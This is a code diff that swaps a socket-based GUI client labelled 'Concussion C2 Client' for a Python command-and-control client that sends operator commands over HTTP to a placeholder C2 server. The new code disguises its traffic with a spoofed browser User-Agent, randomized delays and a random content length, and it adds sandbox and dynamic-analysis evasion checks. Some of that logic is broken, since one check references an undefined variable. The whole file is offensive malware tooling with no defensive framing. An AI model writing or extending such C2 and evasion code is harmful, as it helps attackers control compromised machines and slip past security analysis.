@@ -1,57 +1,66 @@
-import tkinter as tk
-import socket
-import logging
-from cryptography.fernet import Fernet
+import requests
+import random
+import time
+import gzip
+import io
 
-# Configure the logging module
-logging.basicConfig(filename='c2_client.log', level=logging.INFO, format='%(asctime)s - %(levelname)s: %(message)s')
+# List of known sandbox artifacts (customize this list)
+sandbox_artifacts = ["sandbox_file.exe", "sandbox_reg_key"]
 
-class C2Client:
-    def __init__(self, root):
-        self.root = root
-        root.title("Concussion C2 Client")
+def send_get_request(command):
+    # Introduce a randomized delay before sending GET requests
+    randomized_delay()
 
-        self.server_host = 'YOUR_SERVER_IP'
-        self.server_port = 12345  # Match the server's port
-        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            # Attempt to connect to the C2 server
-            self.client_socket.connect((self.server_host, self.server_port))
-        except ConnectionRefusedError:
-            logging.error("Connection refused. Ensure the C2 server is running.")
-            self.root.destroy()
-        except Exception as e:
-            logging.error(f"Error: {e}")
-            self.root.destroy()
+    # Check for known sandbox artifacts before sending the request
+    if check_sandbox_artifacts(command):
+        print("Known sandbox artifacts detected. Delaying execution...")
+        time.sleep(random.randint(5, 10))  # Delay execution for 5 to 10 seconds
+        return "Sandbox artifacts detected. Execution delayed."
 
-        # Load the shared symmetric key (you should securely distribute this key from the server)
-        self.symmetric_key = b'YOUR_SHARED_SYMMETRIC_KEY'
-        self.cipher_suite = Fernet(self.symmetric_key)
+    # Check for dynamic analysis indicators before sending the request
+    if check_dynamic_analysis():
+        print("Dynamic analysis detected. Delaying execution...")
+        time.sleep(random.randint(5, 10))  # Delay execution for 5 to 10 seconds
+        return "Dynamic analysis detected. Execution delayed."
 
-        self.setup_gui()
+    # Send an HTTP GET request to the C2 server on port 80 with custom headers and variable content length
+    server_url = "http://c2_server_ip"  # Replace with your server's IP
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
+        'X-Custom-Header': 'MyCustomValue',  # Add your custom header here
+        'Content-Length': str(random.randint(50, 500))  # Random content length
+    }
+    response = requests.get(f"{server_url}/{command}", headers=headers)
+    return decompress_response(response.content)
 
-    def setup_gui(self):
-        # Create and configure your GUI elements here
-        # ...
+def check_sandbox_artifacts(command):
+    # Check for known sandbox artifacts in the received command
+    for artifact in sandbox_artifacts:
+        if artifact in command:
+            return True
+    return False
 
-    def send_command(self):
-        # Implement command sending logic here
-        # ...
+def check_dynamic_analysis():
+    # Check for indicators of dynamic analysis (customize this check)
+    # For example, you can look for the presence of debuggers, virtualized environments, or monitoring tools
+    if "debugger" in headers.get('User-Agent', '').lower():
+        return True
+    return False
 
-    def show_history(self):
-        # Implement command history retrieval logic here
-        # ...
+def randomized_delay():
+    # Introduce a random delay before sending a request (customize this delay)
+    time.sleep(random.uniform(1, 5))
 
-    def close_connection(self):
-        # Log connection closure when the GUI is closed
-        logging.info("Connection to the C2 server closed.")
-        self.client_socket.close()
+def decompress_response(response):
+    # Decompress the response using gzip
+    with gzip.GzipFile(fileobj=io.BytesIO(response), mode='rb') as f:
+        decompressed_data = f.read()
+    return decompressed_data.decode('utf-8')
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    client = C2Client(root)
-
-    # Configure the close button to log connection closure
-    root.protocol("WM_DELETE_WINDOW", client.close_connection)
-
-    root.mainloop()
+    while True:
+        command = input("Enter command: ")
+        if command.lower() == "exit":
+            break
+        result = send_get_request(command)
+        print(f"Response: {result}")
